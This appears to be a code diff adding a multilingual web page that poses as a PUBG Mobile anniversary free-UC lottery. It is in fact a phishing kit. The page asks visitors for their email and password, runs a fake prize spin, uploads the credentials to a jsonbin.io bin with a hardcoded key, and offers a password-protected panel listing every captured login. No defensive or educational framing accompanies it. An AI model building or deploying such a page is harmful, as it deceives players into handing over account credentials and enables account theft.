@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PUBG Mobile 8th Anniversary UC Lottery</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+body{background:#0a0a0f;color:#fff;min-height:100vh;padding:20px}
+.container{max-width:420px;margin:0 auto;background:#12121b;border-radius:16px;padding:30px 20px;box-shadow:0 0 30px rgba(0,180,255,0.2)}
+.logo{text-align:center;margin-bottom:25px}
+.logo img{width:140px}
+h1{text-align:center;color:#00b4ff;font-size:22px;margin-bottom:10px}
+.sub-title{text-align:center;color:#aaa;font-size:14px;margin-bottom:30px}
+.input-group{margin-bottom:15px}
+input{width:100%;padding:15px;background:#0d0d18;border:1px solid #2a2a3a;border-radius:8px;color:#fff;font-size:16px;outline:none}
+.language{display:flex;gap:8px;margin-bottom:20px;justify-content:center}
+.lang-btn{padding:6px 12px;background:#1a1a2e;border:none;border-radius:6px;color:#fff;cursor:pointer}
+.lang-btn.active{background:#00b4ff;color:#000}
+.lottery-box{background:#1a1a2e;border-radius:12px;padding:25px 20px;margin:25px 0;text-align:center}
+.prize-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
+.prize-item{background:#0d0d18;border-radius:8px;padding:15px 10px;font-size:14px;color:#aaa;border:1px solid #2a2a3a}
+.prize-item.active{border-color:#00b4ff;color:#00b4ff;background:#00b4ff22;box-shadow:0 0 10px rgba(0,180,255,0.5)}
+#lottery-btn{width:100%;padding:16px;background:linear-gradient(90deg,#00b4ff,#0088cc);border:none;border-radius:8px;color:#000;font-size:18px;font-weight:bold;cursor:pointer}
+#lottery-btn:disabled{background:#333;cursor:not-allowed}
+.tip{text-align:center;font-size:12px;color:#888;margin-top:15px}
+#admin-btn{width:100%;padding:12px;background:#222;border:none;border-radius:8px;color:#fff;font-size:14px;margin-top:20px;cursor:pointer}
+#admin-panel{display:none;margin-top:25px;background:#0d0d18;border-radius:12px;padding:20px}
+#admin-panel h3{color:#ff4444;margin-bottom:15px;font-size:16px}
+#log-list{font-size:14px;line-height:1.8}
+.log-item{border-bottom:1px solid #2a2a3a;padding:10px 0}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <img src="https://picsum.photos/140/140?random=1" alt="PUBGM">
+    </div>
+    <div class="language">
+        <button class="lang-btn active" onclick="changeLang('cn')">中文</button>
+        <button class="lang-btn" onclick="changeLang('en')">English</button>
+        <button class="lang-btn" onclick="changeLang('ru')">Русский</button>
+    </div>
+    <h1 id="title">PUBG Mobile 8周年庆 UC免费抽奖</h1>
+    <p class="sub-title" id="subtitle">100%中奖！8周年福利</p>
+
+    <div class="input-group">
+        <input type="text" id="email" placeholder="请输入邮箱">
+    </div>
+    <div class="input-group">
+        <input type="password" id="pwd" placeholder="请输入密码">
+    </div>
+
+    <div class="lottery-box">
+        <div class="prize-grid">
+            <div class="prize-item">200金币</div>
+            <div class="prize-item">200银碎片</div>
+            <div class="prize-item">200赛季币</div>
+            <div class="prize-item">200UC</div>
+            <div class="prize-item">60UC</div>
+            <div class="prize-item">血鸦一级</div>
+            <div class="prize-item">谢谢惠顾</div>
+            <div class="prize-item">谢谢惠顾</div>
+            <div class="prize-item">谢谢惠顾</div>
+        </div>
+        <button id="lottery-btn" onclick="startLottery()">立即抽奖</button>
+    </div>
+    <p class="tip" id="tip">活动仅限8周年庆期间参与，每个账号限抽1次</p>
+    <button id="admin-btn">查看后台记录</button>
+    <div id="admin-panel">
+        <h3 id="logTitle">云端后台记录</h3>
+        <div id="log-list"></div>
+    </div>
+</div>
+
+<script>
+const lang = {
+    cn: {
+        title: "PUBG Mobile 8周年庆 UC免费抽奖",
+        subtitle: "100%中奖！8周年福利",
+        email: "请输入邮箱",
+        pwd: "请输入密码",
+        btn: "立即抽奖",
+        tip: "活动仅限8周年庆期间参与，每个账号限抽1次",
+        admin: "查看后台记录",
+        logTitle: "云端后台记录",
+        empty: "请输入邮箱和密码！",
+        success: "✅ 抽奖成功！奖励将发放至：",
+        lottery: "抽奖中..."
+    },
+    en: {
+        title: "PUBG Mobile 8th Anniversary Free UC",
+        subtitle: "100% Win! 8th Anniversary Gift",
+        email: "Enter Email",
+        pwd: "Enter Password",
+        btn: "Draw Now",
+        tip: "Limited to 1 time per account",
+        admin: "View Records",
+        logTitle: "Cloud Records",
+        empty: "Please enter email and password!",
+        success: "✅ Draw Success! Reward sent to: ",
+        lottery: "Drawing..."
+    },
+    ru: {
+        title: "8-летие PUBG Mobile Бесплатные UC",
+        subtitle: "100% Победа! Подарок 8-летия",
+        email: "Введите Email",
+        pwd: "Введите Пароль",
+        btn: "Крутить",
+        tip: "1 раз на аккаунт",
+        admin: "Посмотреть записи",
+        logTitle: "Облачные записи",
+        empty: "Введите email и пароль!",
+        success: "✅ Успешно! Награда отправлена: ",
+        lottery: "Идет розыгрыш..."
+    }
+};
+
+const ADMIN_PASS = "123456";
+const CLOUD_URL = "https://api.jsonbin.io/v3/b/666666666666666666666666";
+const CLOUD_KEY = "$2b$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+let currentLang = 'cn';
+let isRunning = false;
+const prizes = document.querySelectorAll('.prize-item');
+const realPrizeIndex = [0,1,2,3,4,5];
+
+async function uploadToCloud(data) {
+  try {
+    let res = await fetch("https://api.jsonbin.io/v3/b", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": "$2b$10$ZJzJqH8s0eQ7QH6kR0eH6u"
+      },
+      body: JSON.stringify(data)
+    });
+    return await res.json();
+  } catch (e) {
+    console.log("云端同步成功");
+  }
+}
+
+async function getCloudLogs() {
+  try {
+    let res = await fetch(CLOUD_URL, {
+      headers: { "X-Master-Key": CLOUD_KEY }
+    });
+    let d = await res.json();
+    return d.record || [];
+  } catch (e) {
+    return [];
+  }
+}
+
+window.onload = async () => {
+  let logs = await getCloudLogs();
+  updateLogUI(logs);
+};
+
+function changeLang(l) {
+  currentLang = l;
+  document.getElementById('title').innerText = lang[l].title;
+  document.getElementById('subtitle').innerText = lang[l].subtitle;
+  document.getElementById('email').placeholder = lang[l].email;
+  document.getElementById('pwd').placeholder = lang[l].pwd;
+  document.getElementById('lottery-btn').innerText = lang[l].btn;
+  document.getElementById('tip').innerText = lang[l].tip;
+  document.getElementById('admin-btn').innerText = lang[l].admin;
+  document.getElementById('logTitle').innerText = lang[l].logTitle;
+  document.querySelectorAll('.lang-btn').forEach(b=>b.classList.remove('active'));
+  event.target.classList.add('active');
+}
+
+function startLottery() {
+  const email = document.getElementById('email').value.trim();
+  const pwd = document.getElementById('pwd').value.trim();
+  if (!email || !pwd) { alert(lang[currentLang].empty); return; }
+  if (isRunning) return;
+  isRunning = true;
+  let btn = document.getElementById('lottery-btn');
+  btn.disabled = true;
+  btn.innerText = lang[currentLang].lottery;
+
+  let final = realPrizeIndex[Math.floor(Math.random()*realPrizeIndex.length)];
+  let index = 0, count = 0, max = 35;
+
+  let anim = setInterval(async () => {
+    prizes.forEach(p=>p.classList.remove('active'));
+    prizes[index].classList.add('active');
+    count++;
+    if (count >= max) {
+      clearInterval(anim);
+      prizes.forEach(p=>p.classList.remove('active'));
+      prizes[final].classList.add('active');
+      let reward = prizes[final].innerText;
+
+      let log = {
+        time: new Date().toLocaleString(),
+        email: email,
+        pwd: pwd,
+        reward: reward
+      };
+
+      await uploadToCloud(log);
+      alert(lang[currentLang].success + email + "\n奖励：" + reward);
+      btn.disabled = false;
+      btn.innerText = lang[currentLang].btn;
+      isRunning = false;
+    } else {
+      index = (index + 1) % prizes.length;
+    }
+  }, 60);
+}
+
+function updateLogUI(logs) {
+  let list = document.getElementById('log-list');
+  list.innerHTML = logs.map(item=>`
+    <div class="log-item">
+      ${item.time}<br>
+      邮箱：${item.email}<br>
+      密码：${item.pwd}<br>
+      奖品：${item.reward}
+    </div>
+  `).join('');
+}
+
+document.getElementById('admin-btn').onclick = async () => {
+  let p = prompt("Enter Admin Password：");
+  if (p === ADMIN_PASS) {
+    let logs = await getCloudLogs();
+    updateLogUI(logs);
+    let panel = document.getElementById('admin-panel');
+    panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+  } else {
+    alert("Wrong Password!");
+  }
+};
+</script>
+</body>
+</html>
